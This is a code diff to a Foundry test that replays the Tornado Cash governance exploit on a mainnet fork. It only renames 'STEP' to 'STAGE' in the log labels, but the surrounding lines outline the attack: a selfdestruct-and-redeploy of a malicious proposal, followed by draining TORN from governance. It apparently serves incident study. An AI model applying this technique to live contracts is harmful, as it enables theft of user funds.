@@ -48,7 +48,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         vm.selectFork(forkIdBefore);
         console2.log("Fork Block Number: %s", block.number);
 
-        console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL - GET SOME TORN ========");
+        console2.log("\n======== STAGE 0. DEPLOY FACTORY AND PROPOSAL - GET SOME TORN ========");
         // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
         vm.startPrank(ATTACKER2);
@@ -57,7 +57,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         _initialTornLock();
         vm.stopPrank();
 
-        console2.log("\n======== STEP 1. SUBMIT MALICIOUS PROPOSAL ========");
+        console2.log("\n======== STAGE 1. SUBMIT MALICIOUS PROPOSAL ========");
         // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the
         // Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0
@@ -70,7 +70,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         );
         vm.stopPrank();
 
-        console2.log("\n======== STEP 1.1 VOTE PROPOSAL ========");
+        console2.log("\n======== STAGE 1.1 VOTE PROPOSAL ========");
         console2.log("Locking funds with voter...");
         cheat.rollFork(17_265_000);
         deal(address(tornToken), SomeVoter, 300_000 ether);
@@ -86,7 +86,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         console2.log("Vote successfully casted");
         vm.stopPrank();
 
-        console2.log("\n======== STEP 2. DEPLOY AND PREPARE MULTIPLE ACCOUNTS ========");
+        console2.log("\n======== STAGE 2. DEPLOY AND PREPARE MULTIPLE ACCOUNTS ========");
         // 2. Deploy multiple minion contracts with the Attacker Contract and lock zero TORN with
         // each one in the Governance with the Attacker 1
         // https://explorer.phalcon.xyz/tx/eth/0x26672ad9140d11b64964e79d0ed5971c26492786cfe0edf57034229fdc7dc529?line=835&debugLine=835
@@ -96,7 +96,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         attacker1contract.deployMultipleContracts(5);
         vm.stopPrank();
 
-        console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
+        console2.log("\n======== STAGE 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
         // 3. Selfdestruct both the proposal and transient contract, with the account 2
         // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0
         vm.startPrank(ATTACKER2);
@@ -110,7 +110,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         vm.rollFork(17_299_106);
         console2.log("Fork Block Number: %s", block.number); // just before the redeployment
 
-        console2.log("\n======== STEP 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
+        console2.log("\n======== STAGE 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
         // 3. Redeploy malicious proposal with the additional SSTORE instructions
         // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2
         console2.log("Before Redeployment Code Size");
@@ -125,7 +125,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         console2.log("Transient: %s", address(proposal_20).code.length);
         console2.log("Proposal: %s", address(transientContract).code.length);
 
-        console2.log("\n======== STEP 5. EXECUTE MALICIOUS PROPOSAL ========");
+        console2.log("\n======== STAGE 5. EXECUTE MALICIOUS PROPOSAL ========");
         cheat.rollFork(17_299_138); // just before the execution
         console2.log("Executing malicious proposal...");
         // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
@@ -140,7 +140,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         TORNADO_GOVERNANCE.execute(proposalId);
         console2.log("Execution successful");
 
-        console2.log("\n======== STEP 6. DRAIN TORN FROM GOVERNANCE ========");
+        console2.log("\n======== STAGE 6. DRAIN TORN FROM GOVERNANCE ========");
         console2.log("Draining TORN balance...");
 
         // 6. On each of the previously deployed minion, drain the governance by calling unlock() and
